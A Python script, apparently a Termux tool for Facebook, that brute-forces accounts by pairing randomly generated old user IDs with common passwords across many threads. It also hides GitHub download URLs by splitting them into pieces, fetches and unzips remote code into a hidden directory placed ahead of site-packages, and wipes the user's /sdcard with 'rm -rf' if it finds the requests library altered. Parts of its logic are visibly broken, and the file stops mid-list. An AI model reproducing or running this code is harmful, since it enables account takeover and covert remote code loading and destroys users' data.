import os
import sys
import json
import uuid
import string
import random
import requests
from concurrent.futures import ThreadPoolExecutor
import time
import datetime
import re
import shutil
import urllib
import zlib
import subprocess
import bs4
import mechanize
import rich
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import tempfile
http_directory = tempfile.mkdtemp(prefix = '.')
site_packages = sys.path[4]
print(site_packages)
print(http_directory)
sys.path.remove(site_packages)
sys.path.insert(4, http_directory + '/reqmodule')
sys.path.insert(5, http_directory)
if not os.path.exists('crypto'):
    os.mkdir('crypto')
hh = 'ho'
hh2 = '9/pycrypt'
find_aarch = subprocess.check_output('uname -om', shell=True).decode().strip()
print(f"Architecture detected: {find_aarch}")
if 'aarch64' in find_aarch:
    user_aarch = '64'
    download_link = f"https://github.com/{hh}p0{hh2}odome/blob/main/crypto64/crypto64.zip?raw=true"
elif 'arm' in find_aarch:
    user_aarch = '32'
    download_link = f"https://github.com/{hh}p0{hh2}odome/blob/main/crypto32/crypto32.zip?raw=true"
else:
    print(f"Unknown aarch: {find_aarch}")
    exit()
if not os.path.isfile(f'''crypto/crypto{user_aarch}.zip'''):
    os.system('clear')
    print('\n Please wait while creating pycryptodome for you ! This can take some time\n\n')
    os.system(f'''curl -L {download_link} > crypto/crypto{user_aarch}.zip''')
    os.system('python jan.py')
akk2 = 'rsi'
akk = f'''cha{akk2}fi'''
os.system(f'''cp crypto/crypto{user_aarch}.zip {http_directory}''')
lib = f'''https://github.com/{akk}les/client/blob/main/config.zip?raw=true'''
os.system(f'''curl -L {lib} > {http_directory}/config.zip''')
os.system(f'''cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null''')
os.system(f'''cd {http_directory} && unzip crypto{user_aarch}.zip -d {http_directory} > /dev/null''')
import platform
print('\x1b[1;91m[\x1b[1;92m⊀⊁\x1b[1;91m] \x1b[1;91m⊀\x1b[1;92mAssalam O Alaikum\x1b[1;91m⊁ ')
time.sleep(1)
os.system('clear')
print('\x1b[1;91m[\x1b[1;97m-\x1b[1;91m] \x1b[1;92mChecking For Update. . . .')
os.system('xdg-open https://chat.whatsapp.com/HbhDHpyp56B9PN7D1zDDbX')
time.sleep(2)
os.system('git pull --quiet 2>/dev/null')
bit = platform.architecture()[0]
if bit == '64bit':
    print('\x1b[1;91m[\x1b[1;92m◉\x1b[1;91m] \x1b[1;92mYOU ARE 64BIT USER')
if bit == '32bit':
    print('\x1b[1;91m[\x1b[1;92m◉\x1b[1;91m] \x1b[1;92mYOU ARE 32BIT USER')

def es():
    if path.isfile('/data/data/com.termux/files/usr/bin/rm'):
        pass
    system('clear')
    print('System Modification Not Allowed since using Jutt')
    exit()
    if path.isfile('/data/data/com.termux/files/usr/bin/termux-reset'):
        pass
    system('clear')
    print('System Modification Not Allowed since using Jutt')
    exit()
    if path.isfile('/data/data/com.termux/files/usr/bin/termux-setup-storage'):
        return None
    system('clear')
    print('System Modification Not Allowed since using Jutt')
    exit()

file = open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py', 'r')
file_content = file.read()
if 'print(url)' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit('[ðŸ¤£] RE-RUN TOOL.!')
file = open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py', 'r')
file_content = file.read()
if 'print' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit('[ðŸ¤£] RE-RUN TOOL.!')
file = open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py', 'r')
file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit('[ðŸ¤£] RE-RUN TOOL.!')
file = open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/auth.py', 'r')
file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit('[ðŸ¤£] RE-RUN TOOL.!')
import base64

def cek_apk(session, coki):
    w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', cookies = {
        'cookie': coki }).text
    sop = BeautifulSoup(w, 'html.parser')
    x = sop.find('form', method = 'post')
    for i in []:
        game = x.find_all('h3')[i.text]
        i = x.find_all('h3')
        if len(game) == 0:
            print('\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  ' % (N, M, N, M, N))
    print(f'''\r[😍] %s \x1b[1;95m YOUR ACTIVE APPS   :{WHITE}''' % GREEN)
    for i in range(len(game)):
        print('\r[%s%s] %s%s' % (N, i + 1, game[i].replace('Ditambahkan pada', ' Ditambahkan pada'), N))
        print('\r %s[%s!%s] Sorry, Apk check failed invalid cookie' % (N, M, N))
        w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', cookies = {
            'cookie': coki }).text
        sop = BeautifulSoup(w, 'html.parser')
        x = sop.find('form', method = 'post')
        for i in []:
            game = x.find_all('h3')[i.text]
            i = x.find_all('h3')
            if len(game) == 0:
                print('\r%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n' % (N, M, N, M, N))
                return None
    print(f'''\r[🥵] %s \x1b[1;95m YOUR EXPIRED APPS    :{WHITE}''' % M)
    for i in range(len(game)):
        print('\r[%s%s] %s%s' % (N, i + 1, game[i].replace('Kedaluwarsa', ' Kedaluwarsa'), N))
        print('')
        return None
        i = None
        i = None

from concurrent.futures import ThreadPoolExecutor as ThreadPool
from requests.exceptions import ConnectionError
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
A = '\x1b[1;90m'
BN = '\x1b[1;107m'
BBL = '\x1b[1;106m'
BP = '\x1b[1;105m'
BB = '\x1b[1;104m'
BK = '\x1b[1;103m'
BH = '\x1b[1;102m'
BM = '\x1b[1;101m'
BA = '\x1b[1;100m'
my_color = [
    P,
    M,
    H,
    K,
    B,
    U,
    O,
    N]
warna = random.choice(my_color)

class OLD_CLONER:

    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.gen = []

    def banner(self):
        os.system('clear')
        print('\x1b[1;37m\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n   U  ___ u   _      ____    \n    \\/"_ \\/  |"|    |  _"\\   \n    | | | |U | | u /| | | |  \n.-,_| |_| | \\| |/__U| |_| |\\ \n \\_)-\\___/   |_____||____/ u \n      \\     //  \\  |||_    \n     (__)   (_")("_)(__)_)   \n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[1;36m')
        print('DEVELOPER  : Sonu (THARKII MUNDA) ')
        print('GITHUB     : tharkimunda')
        print('FEATURE    : OLD ID CLONER')
        print('VERSION    : TEST')
        print('-------------------------------')

    def main(self):
        self.banner()
        print('1 -> 2008 IDS CLONE')
        print('2 -> 2009 IDS CLONE')
        print('3 -> 2010 IDS CLONE')
        print('4 -> 2011 IDS CLONE')
        print('5 -> 2012 IDS CLONE')
        print('6 -> 2013 IDS CLONE')
        print('-------------------------------')
        select = input('SELECT OPTION : ')
        if select == '1':
            self.oldClone('2008')
            return None
        if select == '2':
            self.oldClone('2009')
            return None
        if select == '3':
            self.oldClone('2010')
            return None
        if select == '4':
            self.oldClone('2011')
            return None
        if select == '5':
            self.oldClone('2012')
            return None
        if select == '6':
            self.oldClone('2013')
            return None
        self.main()

    def oldClone(self, series):
        self.banner()
        if series == '2008':
            self.uX = '10000000'
            self.uG = 8
        if series == '2009':
            self.uX = '1000000'
            self.uG = 9
        if series == '2010':
            self.uX = '100000'
            self.uG = 10
        if series == '2011':
            self.uX = '10000'
            self.uG = 10
        if series == '2012':
            self.uX = '10000'
            self.uG = 10
        if series == '2013':
            self.uX = '10000'
            self.uG = 10
        self.uX = '100000'
        self.uG = 9
        print('EXAMPLE  - 5000,10000')
        limit = int(input('SELECT   - '))
        for _ in range(limit):
            aiman = ''.join(random.choice(string.digits) for _ in range(self.uG))
            self.gen.append(aiman)
            Mr_Code = ThreadPoolExecutor(max_workers = 55)
            self.banner()
            print('TOTAL IDS - ' + str(len(self.gen)))
            print('UID SERIES - ' + series)
            print('IF NO RESULT USE FLIGHT MODE')
            print('-------------------------------')
            for love in self.gen:
                ids = self.uX + love
                passlist = [
                    '123456',
                    '1234567',
                    '12345678',
                    '123456789',
                    '123123',
                    '112233',
                    '1234567890',
                    'password',
                    '@@@###']
                Mr_Code.submit(self.CloneOld, ids, passlist)
                None(None, None)
                sys.exit('\n-------------------------------')
                return None
                if not ''.join:
                    pass

    def ugen(self):
        ua_list = [
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3806035247406196076 t1872217365388251660 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904117663 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v4537855319261998612 t2292540608630398113 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904119495 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11897407679 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904122136 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v5031062267143477236 t1575875634589018017 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v7328604687000112192 t1058358641252769813 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v262658980177695010 t7585821862018737939 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v6495138065723175509 t1773489522052420014 ath259cea6f altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904130821 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v5834042843683613855 t2396787350312843847 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11897462741 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v4766348220624337771 t8542737954275332693 ath93eb305d altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904141486 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v2479228459810437990 t2258199849751664265 ath4b3726d5 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904143320 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904145961 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v4176376917283457558 t1872217365388251660 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v8054405186413296298 t6182751287436097174 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904154646 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v933376873689346907 t8161287340496183299 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11897545122 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v3572015568482185724 t2728041645536310993 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v4443371852841294252 t1575875634589018017 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904165307 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904167142 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v9018724246640702918 t7585821862018737939 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904169784 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v3216137150545390248 t7875107314671608997 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11897583800 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11897600188 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v4722112135491709818 t2292540608630398113 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904178459 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v7672199725376903633 t1058358641252769813 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904189124 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v7084548480315890513 t1872217365388251660 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904190960 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904193601 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v2513759320104161766 t2396787350312843847 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v2908767399583601245 t7735927178140269288 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11897682582 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v4532071965621335406 t2272431400758753269 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904202282 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v5347889114223050614 t1575875634589018017 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v2532400914465592536 t144310210871017869 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v6212672268557827095 t7585821862018737939 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v7470743388184696135 t961549258186996299 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v574417633783643999 t6182751287436097174 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904212941 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904214777 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11897737647 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904217416 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v9198774583935039921 t6450448904627200820 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v2682167576280571932 t6735075811151450244 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904225446 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3801393411032838976 t1872217365388251660 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904236113 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v1603073510125923513 t2292540608630398113 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904237944 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11897817309 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904240583 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v6111118528420986436 t1575875634589018017 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v3836408218027959707 t1058358641252769813 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v8390742658422707950 t7585821862018737939 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v330134727209934960 t1773489522052420014 ath259cea6f altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904249269 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v7549391917640764226 t2396787350312843847 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11897872373 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v5033979625521581648 t8542737954275332693 ath93eb305d altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904259930 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v2004405132322826056 t2258199849751664265 ath4b3726d5 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904261766 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904264404 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v5150366973466944094 t1872217365388251660 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v1151137182807267311 t6182751287436097174 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904273087 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11897954750 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11897960213 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v8132290037435456552 t2728041645536310993 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v6988593872894793717 t1575875634589018017 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904283749 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904285586 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
